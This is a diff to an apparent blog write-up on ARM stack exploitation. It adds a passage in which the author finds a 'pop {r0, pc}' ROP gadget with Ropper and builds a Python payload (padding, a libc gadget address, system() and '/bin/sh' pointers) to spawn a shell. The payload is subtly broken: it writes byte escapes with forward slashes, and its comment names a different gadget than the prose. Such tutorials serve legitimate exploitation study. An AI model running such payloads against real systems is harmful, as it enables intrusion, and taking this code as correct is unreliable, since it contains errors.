@@ -205,7 +205,27 @@ However, this still didn't work. Some examination revealed that since the BL swa
 
 So, I couldn't find a satisfying **LDR r0, [SP]** instruction. Were there any alternatives? After thinking for a bit, I realised that I could try, instead, **popping** system() and "/bin/sh" off the stack into r0 and pc. So, lets open up Ropper again and do "**"search /1/ pop{r0"**.
 
+![ropper3.png]({{site.baseurl}}/_posts/ropper3.png)
+_The perfect gadget?_
 
+
+And straight off the bat we see that there is a **pop {r0, pc}** gadget! Now we can alter our code to include this. Let's first check out the new flow that we require:
+![stack3.png]({{site.baseurl}}/_posts/stack3.png)
+![stack4.png]({{site.baseurl}}/_posts/stack4.png)
+
+_Notice that bin/sh and system() are inverted compared to the previous try_
+
+
+Now, our payload looks like:
+
+	#!/usr/bin/python
+    from struct import pack
+    libc = 0xb6ede000 #Base address of libc
+    
+    payload = 'A' * 132
+    payload += pack('<I', libc + 0x0000726d) #The gadget LDR r0, [SP, #4]
+    payload += "/x8c/xb4/xf0/xb6/x7c/x40/xfb/xb6"
+    print payload
 
 
 
